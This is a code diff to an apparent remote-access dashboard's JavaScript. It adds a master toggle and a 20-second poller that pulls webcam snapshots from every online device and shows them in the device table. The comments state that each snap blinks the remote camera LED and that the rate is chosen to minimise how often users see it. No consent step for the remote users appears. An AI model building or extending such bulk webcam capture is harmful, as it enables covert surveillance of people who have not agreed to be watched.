@@ -194,15 +194,26 @@ if (HC_V2) {
         var head = document.createElement('div');
         head.className = 'v2-list-head';
         head.innerHTML =
-          '<span></span>' +            // col 1: OS icon
+          '<span></span>' +            // col 1: OS thumb
           '<span>Device</span>' +      // col 2
           '<span>Status</span>' +      // col 3
           '<span>Tags</span>' +        // col 4
           '<span>Signed-in</span>' +   // col 5
           '<span>Agent</span>' +       // col 6
           '<span>Last seen</span>' +   // col 7
-          '<span style="text-align:right">Actions</span>'; // col 8
+          '<span>Cam <label class="v2-cams-toggle" title="Toggles webcam snapshots for every device below. Each snap briefly activates the remote PC\'s camera indicator — users will see the LED blink."><input type="checkbox" id="cams-master"></label></span>' + // col 8: camera thumb + master toggle
+          '<span style="text-align:right">Actions</span>'; // col 9
         box.parentNode.insertBefore(head, box);
+        // Wire the master cams toggle now that the header's in the DOM.
+        const camsTog = document.getElementById('cams-master');
+        if (camsTog) {
+          camsTog.checked = !!camsMasterOn;
+          camsTog.addEventListener('change', (e) => {
+            setCamsMaster(!!e.target.checked);
+            if (e.target.checked) toast('Camera snapshots enabled — remote users will see the LED flash every ~20 s', '');
+            else toast('Camera snapshots stopped', '');
+          });
+        }
       }
 
       // ---- Table footer: Showing · Updated · Tip ----
@@ -615,7 +626,7 @@ function connectWS() {
     if (ev.data instanceof ArrayBuffer) { if (!$('#screen-wrap').classList.contains('rtc')) drawBinaryFrame(ev.data); return; } // JPEG frame (ignored while WebRTC video is up)
     let msg; try { msg = JSON.parse(ev.data); } catch { return; }
     switch (msg.type) {
-      case 'agents': devicesCache = msg.list; renderDevices(); maybeAutoAttach(); startLiveThumbs(); break;
+      case 'agents': devicesCache = msg.list; renderDevices(); maybeAutoAttach(); startLiveThumbs(); startLiveWebcams(); break;
       case 'stats': applyStats(msg.stats); break;
       case 'inputAck': break;
       case 'inputStats': break;
@@ -859,11 +870,53 @@ function deviceThumb(d, m) {
     + '" alt="" onerror="this.style.display=\'none\';var s=this.nextElementSibling;if(s)s.style.display=\'inline-block\'"/>'
     + ic;
 }
+// Master webcam-snapshot toggle. Persisted in localStorage so refreshing
+// the dashboard doesn't accidentally kick everyone's camera back on. When
+// ON, startLiveWebcams polls each online device's webcam every WEBCAM_POLL_MS.
+// When OFF, poller is paused and every row shows the "OFF" placeholder.
+let camsMasterOn = false;
+try { camsMasterOn = localStorage.getItem('camsMasterOn') === '1'; } catch {}
+function setCamsMaster(on) {
+  camsMasterOn = !!on;
+  try { localStorage.setItem('camsMasterOn', camsMasterOn ? '1' : '0'); } catch {}
+  // When toggled OFF, immediately paint every tile black (don't wait for a
+  // tick). When ON, next tick fills them in with real frames.
+  if (!camsMasterOn) {
+    document.querySelectorAll('.device-row .dr-cam').forEach((cell) => {
+      cell.innerHTML = '<span class="dr-cam-off">OFF</span>';
+    });
+  }
+}
 // Live mini-display refresher. Every N seconds we tell each online device
 // to send a fresh screenshot (POST /snap), then bump the img src to force a
 // reload once the file lands. Pauses when the tab is hidden so we don't
 // burn bandwidth / agent CPU for a dashboard nobody's looking at.
 const LIVE_THUMB_INTERVAL_MS = 8000;
+// Webcam poller — slower cadence than the screen thumbs. Each snap activates
+// the remote's camera LED briefly, so we deliberately keep this low (20 s)
+// to minimise how often users see the "camera in use" indicator flash.
+const WEBCAM_POLL_MS = 20000;
+let _webcamTimer = null;
+function startLiveWebcams() {
+  if (_webcamTimer) return;
+  _webcamTimer = setInterval(() => {
+    if (!camsMasterOn || document.visibilityState === 'hidden') return;
+    const rows = document.querySelectorAll('.device-row.online');
+    for (const row of rows) {
+      const id = row.dataset.id;
+      const cell = row.querySelector('.dr-cam');
+      if (!cell) continue;
+      deviceOp(id, 'webcam-snap', {}, { onResult: (m) => {
+        if (!camsMasterOn) return; // toggled off while in flight — drop
+        if (!m.ok || !m.data || !m.data.jpeg) {
+          cell.innerHTML = '<span class="dr-cam-off">—</span>';
+          return;
+        }
+        cell.innerHTML = '<img class="dr-cam-img" src="' + m.data.jpeg + '" alt=""/><span class="dr-cam-dot"></span>';
+      }});
+    }
+  }, WEBCAM_POLL_MS);
+}
 let _liveThumbTimer = null;
 function startLiveThumbs() {
   if (_liveThumbTimer) return;
@@ -1016,7 +1069,7 @@ function createDeviceCard(d, st) {
   // so each piece of metadata has its own cell matching the mockup. Legacy
   // mode keeps the compact 4-cell layout — the extra spans just stay empty.
   const extraCols = HC_V2
-    ? '<span class="dr-tag"></span><span class="dr-user"></span><span class="dr-agent"></span>'
+    ? '<span class="dr-tag"></span><span class="dr-user"></span><span class="dr-agent"></span><span class="dr-cam" title="Live webcam snapshot — toggle at top"><span class="dr-cam-off">OFF</span></span>'
     : '';
   el.innerHTML = `
       <span class="dr-os">${deviceThumb(d, m)}</span>
